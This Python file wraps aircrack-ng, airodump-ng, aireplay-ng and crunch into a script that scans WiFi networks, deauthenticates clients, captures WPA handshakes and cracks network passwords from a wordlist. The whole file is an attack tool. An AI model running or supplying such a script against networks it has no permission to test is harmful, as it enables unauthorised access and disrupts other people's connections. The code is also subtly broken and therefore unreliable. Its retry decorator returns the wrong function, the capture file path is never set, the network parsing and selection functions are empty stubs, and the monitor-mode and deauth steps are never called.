import subprocess
import os
import time
import shutil
import logging
import argparse
from functools import wraps
from pathlib import Path

# Setup logging with dynamic verbosity
def setup_logging(verbose):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

# Exception handling decorator with optional retries and backoff
def command_decorator(success_message=None, failure_message=None, retries=1, backoff=2):
    def decorator(func):
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            delay = backoff
            for attempt in range(retries):
                try:
                    result = func(self, *args, **kwargs)
                    if self.runner.check(result, success_message, failure_message):
                        return True
                except subprocess.SubprocessError as e:
                    logging.error(f"Subprocess error during {func.__name__}: {e}")
                except Exception as e:
                    logging.error(f"Error during {func.__name__}: {e}")
                if attempt < retries - 1:
                    logging.warning(f"Retrying {func.__name__}... (Attempt {attempt + 1}/{retries})")
                    time.sleep(delay)
                    delay *= backoff  # Exponential backoff
            return False
        return decorator
    return decorator

# Run commands with error handling and verbosity support
class CommandRunner:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def run(self, cmd, timeout=None, shell=False):
        if self.verbose:
            logging.debug(f"Running command: {' '.join(cmd)}")
        try:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=shell)
        except subprocess.TimeoutExpired:
            logging.error(f"Command timed out: {' '.join(cmd)}")
        except (FileNotFoundError, OSError) as e:
            logging.error(f"Command failed: {e}")
        return None

    # Check if command was successful, print message
    def check(self, result, success_message=None, failure_message=None):
        if result and result.returncode == 0:
            if success_message:
                logging.info(success_message)
            return True
        else:
            if failure_message:
                logging.error(failure_message)
            return False

# Wrapper-class with wireless attacks and password cracking
class AircrackNGWrapper:

    def __init__(self, runner: CommandRunner):
        self.runner = runner
        self.interface = None
        self.wordlist_path = None
        self.bssid = None
        self.channel = None
        self.capture_file = None
        self.client_bssid = None
        self.handshake_timeout = 120  # Timeout in seconds for handshake capture

    def configure(self, args):
        self.interface = args.interface or self.select_option("Select the interface to use", self.get_interfaces())
        self.wordlist_path = args.wordlist or self.get_input("Enter the path to your existing wordlist file")
        self.list_networks()

        # Optional deauth attack
        self.client_bssid = args.client_bssid

        # Validate file paths
        self.validate_paths()

    def validate_paths(self):
        if self.wordlist_path and not Path(self.wordlist_path).is_file():
            logging.error(f"Wordlist file '{self.wordlist_path}' does not exist.")
            exit(1)

        capture_dir = Path(self.capture_file).parent
        if not capture_dir.exists():
            logging.error(f"Capture file directory '{capture_dir}' does not exist.")
            exit(1)

    def get_interfaces(self):
        result = self.runner.run(['iwconfig'])
        return [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line or "wlan" in line]

    def select_option(self, prompt, options):
        print(f"{prompt}:")
        for idx, option in enumerate(options):
            print(f"{idx + 1}: {option}")
        choice = int(self.get_input(f"Select an option (1-{len(options)}): ")) - 1
        return options[choice]

    @command_decorator("Monitor mode started", "Failed to start monitor mode")
    def start_monitor_mode(self):
        return self.runner.run(['sudo', 'airmon-ng', 'start', self.interface])

    @command_decorator("Monitor mode stopped", "Failed to stop monitor mode")
    def stop_monitor_mode(self):
        return self.runner.run(['sudo', 'airmon-ng', 'stop', self.interface])

    def verify_monitor_mode(self):
        result = self.runner.run(['iwconfig'])
        if result and (f"{self.interface}mon" in result.stdout or "Mode:Monitor" in result.stdout):
            if not "mon" in self.interface:
                self.interface += 'mon'
            return True
        return False

    def list_networks(self):
        logging.info("Scanning for networks...")
        cmd = ['sudo', 'airodump-ng', '--band', 'g', '--output-format', 'csv', '--write', 'temp_scan', self.interface]
        logging.debug(f"Command to run: {' '.join(cmd)}")
        result = self.runner.run(cmd, timeout=60)  # Increased timeout for scanning
        if result and result.returncode == 0:
            if os.path.exists('temp_scan-01.csv'):
                networks = self.parse_networks_from_csv('temp_scan-01.csv')
                if networks:
                    self.bssid = self.select_network(networks)
                    self.channel = self.get_input("Enter the channel of the target network")
                else:
                    logging.error("No networks found in the scan file. Ensure your wireless interface is in monitor mode.")
                    exit(1)
            else:
                logging.error("Scan file not found. Ensure `airodump-ng` is generating the output correctly.")
                exit(1)
        else:
            logging.error("Failed to scan for networks. Check if your wireless interface is in monitor mode and if airodump-ng is installed correctly.")
            logging.error(f"Command output: {result.stderr if result else 'No output'}")
            exit(1)

    def capture_handshake(self):
        cmd = self.build_airodump_cmd()
        logging.info(f"Starting handshake capture on BSSID {self.bssid}, channel {self.channel}...")
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.wait_for_handshake(process)

    def wait_for_handshake(self, process):
        start_time = time.time()
        while time.time() - start_time < self.handshake_timeout:
            if os.path.exists(f"{self.capture_file}-01.cap") and self.is_handshake_captured():
                logging.info("Handshake captured!")
                process.terminate()
                return True
            time.sleep(5)
        process.terminate()
        logging.error("Handshake not captured within the timeout period.")
        exit(1)

    def is_handshake_captured(self):
        result = self.runner.run(['aircrack-ng', '-a2', '-w', '/dev/null', f"{self.capture_file}-01.cap"])
        return result and "1 handshake" in result.stdout

    def deauth_client(self):
        if not self.client_bssid:
            return  # Deauth attack is optional

        for attempt in range(3):
            logging.info(f"Attempt {attempt + 1}: Sending deauth packets to {self.client_bssid}...")
            result = self.runner.run(['sudo', 'aireplay-ng', '--deauth', '10', '-a', self.bssid, '-c', self.client_bssid, self.interface])
            if self.runner.check(result, f"Deauth successful on {self.client_bssid}", f"Deauth failed on attempt {attempt + 1}"):
                return
            time.sleep(2)
        logging.error(f"Failed to deauth client {self.client_bssid} after 3 attempts.")
        exit(1)

    def generate_wordlist_with_crunch(self):
        if not shutil.which('crunch'):
            logging.error("Crunch is not installed.")
            exit(1)

        min_length = self.get_input("Enter the minimum length for the passwords")
        max_length = self.get_input("Enter the maximum length for the passwords")
        charset = self.get_input("Enter the character set to use (e.g., abc123@)")
        output_file = self.get_input("Enter the file to save the generated wordlist", "wordlist.txt")

        result = self.runner.run(['crunch', min_length, max_length, charset, '-o', output_file], timeout=300)
        if self.runner.check(result, f"Wordlist generated and saved to {output_file}", "Error generating wordlist"):
            self.wordlist_path = output_file

    def crack_password(self):
        capture_file = f"{self.capture_file}-01.cap"
        if not os.path.exists(capture_file):
            raise FileNotFoundError(f"Capture file '{capture_file}' not found.")

        result = self.runner.run(self.build_aircrack_cmd())
        self.runner.check(result, "Aircrack-ng completed successfully", "Failed to crack the key")

    def build_airodump_cmd(self):
        return ['sudo', 'airodump-ng', '--bssid', self.bssid, '--channel', self.channel, '-w', self.capture_file, self.interface]

    def build_aircrack_cmd(self):
        return ['aircrack-ng', '-w', self.wordlist_path, '-b', self.bssid, f"{self.capture_file}-01.cap"]

    def get_input(self, prompt, default=None):
        user_input = input(f"{prompt} [{default}]: ") or default
        return user_input

    def parse_networks_from_csv(self, file_path):
        # Implement the logic to parse networks from the CSV file
        pass

    def select_network(self, networks):
        # Implement the logic to select a network from the list
        pass

def main():
    parser = argparse.ArgumentParser(description="Aircrack-ng Wrapper")
    parser.add_argument('-i', '--interface', help='Wireless interface to use')
    parser.add_argument('-w', '--wordlist', help='Path to wordlist file')
    parser.add_argument('-c', '--client-bssid', help='Client BSSID for deauth attack')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')

    args = parser.parse_args()
    setup_logging(args.verbose)

    runner = CommandRunner(verbose=args.verbose)
    aircrack_wrapper = AircrackNGWrapper(runner)
    aircrack_wrapper.configure(args)

    if aircrack_wrapper.verify_monitor_mode():
        aircrack_wrapper.capture_handshake()
        if aircrack_wrapper.is_handshake_captured():
            aircrack_wrapper.crack_password()
        else:
            logging.error("Failed to capture handshake.")
    else:
        logging.error("Failed to set interface to monitor mode.")
        exit(1)

if __name__ == '__main__':
    main()
